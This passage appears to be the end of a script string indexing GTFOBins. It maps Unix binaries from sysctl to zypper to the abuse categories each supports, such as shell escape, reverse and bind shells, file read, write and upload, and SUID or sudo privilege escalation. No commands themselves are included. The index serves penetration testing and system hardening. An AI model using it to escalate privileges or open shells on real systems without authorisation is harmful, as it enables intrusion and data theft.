sysctl --> /gtfobins/sysctl/ --> ['File read', 'SUID', 'Sudo']
systemctl --> /gtfobins/systemctl/ --> ['SUID', 'Sudo']
systemd-resolve --> /gtfobins/systemd-resolve/ --> ['Sudo']
tac --> /gtfobins/tac/ --> ['File read', 'SUID', 'Sudo']
tail --> /gtfobins/tail/ --> ['File read', 'SUID', 'Sudo']
tar --> /gtfobins/tar/ --> ['Shell', 'File upload', 'File download', 'File write', 'File read', 'Sudo', 'Limited SUID']
task --> /gtfobins/task/ --> ['Shell', 'Sudo']
taskset --> /gtfobins/taskset/ --> ['Shell', 'SUID', 'Sudo']
tbl --> /gtfobins/tbl/ --> ['File read', 'SUID', 'Sudo']
tclsh --> /gtfobins/tclsh/ --> ['Shell', 'Non-interactive reverse shell', 'SUID', 'Sudo']
tcpdump --> /gtfobins/tcpdump/ --> ['Command', 'Sudo']
tee --> /gtfobins/tee/ --> ['File write', 'SUID', 'Sudo']
telnet --> /gtfobins/telnet/ --> ['Shell', 'Reverse shell', 'Sudo', 'Limited SUID']
tex --> /gtfobins/tex/ --> ['Shell', 'Sudo', 'Limited SUID']
tftp --> /gtfobins/tftp/ --> ['File upload', 'File download', 'SUID', 'Sudo']
tic --> /gtfobins/tic/ --> ['File read', 'SUID', 'Sudo']
time --> /gtfobins/time/ --> ['Shell', 'SUID', 'Sudo']
timedatectl --> /gtfobins/timedatectl/ --> ['Shell', 'Sudo']
timeout --> /gtfobins/timeout/ --> ['Shell', 'SUID', 'Sudo']
tmux --> /gtfobins/tmux/ --> ['Shell', 'File read', 'Sudo']
top --> /gtfobins/top/ --> ['Shell', 'Sudo']
troff --> /gtfobins/troff/ --> ['File read', 'SUID', 'Sudo']
tshark --> /gtfobins/tshark/ --> ['Shell']
ul --> /gtfobins/ul/ --> ['File read', 'SUID', 'Sudo']
unexpand --> /gtfobins/unexpand/ --> ['File read', 'SUID', 'Sudo']
uniq --> /gtfobins/uniq/ --> ['File read', 'SUID', 'Sudo']
unshare --> /gtfobins/unshare/ --> ['Shell', 'SUID', 'Sudo']
update-alternatives --> /gtfobins/update-alternatives/ --> ['SUID', 'Sudo']
uudecode --> /gtfobins/uudecode/ --> ['File read', 'SUID', 'Sudo']
uuencode --> /gtfobins/uuencode/ --> ['File read', 'SUID', 'Sudo']
valgrind --> /gtfobins/valgrind/ --> ['Shell', 'Sudo']
vi --> /gtfobins/vi/ --> ['Shell', 'File write', 'File read', 'Sudo']
view --> /gtfobins/view/ --> ['Shell', 'Reverse shell', 'Non-interactive reverse shell', 'Non-interactive bind shell', 'File upload', 'File download', 'File write', 'File read', 'Library load', 'SUID', 'Sudo', 'Capabilities', 'Limited SUID']
vigr --> /gtfobins/vigr/ --> ['SUID', 'Sudo']
vim --> /gtfobins/vim/ --> ['Shell', 'Reverse shell', 'Non-interactive reverse shell', 'Non-interactive bind shell', 'File upload', 'File download', 'File write', 'File read', 'Library load', 'SUID', 'Sudo', 'Capabilities', 'Limited SUID']
vimdiff --> /gtfobins/vimdiff/ --> ['Shell', 'Reverse shell', 'Non-interactive reverse shell', 'Non-interactive bind shell', 'File upload', 'File download', 'File write', 'File read', 'Library load', 'SUID', 'Sudo', 'Capabilities', 'Limited SUID']
vipw --> /gtfobins/vipw/ --> ['SUID', 'Sudo']
virsh --> /gtfobins/virsh/ --> ['File write', 'File read', 'Sudo']
volatility --> /gtfobins/volatility/ --> ['Shell']
wall --> /gtfobins/wall/ --> ['Sudo']
watch --> /gtfobins/watch/ --> ['Shell', 'SUID', 'Sudo', 'Limited SUID']
wc --> /gtfobins/wc/ --> ['File read', 'SUID', 'Sudo']
wget --> /gtfobins/wget/ --> ['File upload', 'File download', 'File write', 'File read', 'SUID', 'Sudo']
whiptail --> /gtfobins/whiptail/ --> ['File read', 'SUID', 'Sudo']
whois --> /gtfobins/whois/ --> ['File upload', 'File download']
wireshark --> /gtfobins/wireshark/ --> ['Sudo']
wish --> /gtfobins/wish/ --> ['Shell', 'Non-interactive reverse shell', 'Sudo']
xargs --> /gtfobins/xargs/ --> ['Shell', 'File read', 'SUID', 'Sudo']
xelatex --> /gtfobins/xelatex/ --> ['Shell', 'File read', 'Sudo', 'Limited SUID']
xetex --> /gtfobins/xetex/ --> ['Shell', 'Sudo', 'Limited SUID']
xmodmap --> /gtfobins/xmodmap/ --> ['File read', 'SUID', 'Sudo']
xmore --> /gtfobins/xmore/ --> ['File read', 'SUID', 'Sudo']
xpad --> /gtfobins/xpad/ --> ['File read', 'Sudo']
xxd --> /gtfobins/xxd/ --> ['File write', 'File read', 'SUID', 'Sudo']
xz --> /gtfobins/xz/ --> ['File read', 'SUID', 'Sudo']
yarn --> /gtfobins/yarn/ --> ['Shell', 'Sudo']
yelp --> /gtfobins/yelp/ --> ['File read']
yum --> /gtfobins/yum/ --> ['File download', 'Sudo']
zathura --> /gtfobins/zathura/ --> ['Shell', 'Sudo']
zip --> /gtfobins/zip/ --> ['Shell', 'File read', 'Sudo', 'Limited SUID']
zsh --> /gtfobins/zsh/ --> ['Shell', 'File write', 'File read', 'SUID', 'Sudo']
zsoelim --> /gtfobins/zsoelim/ --> ['File read', 'SUID', 'Sudo']
zypper --> /gtfobins/zypper/ --> ['Shell', 'Sudo']
End of GTFOBins """
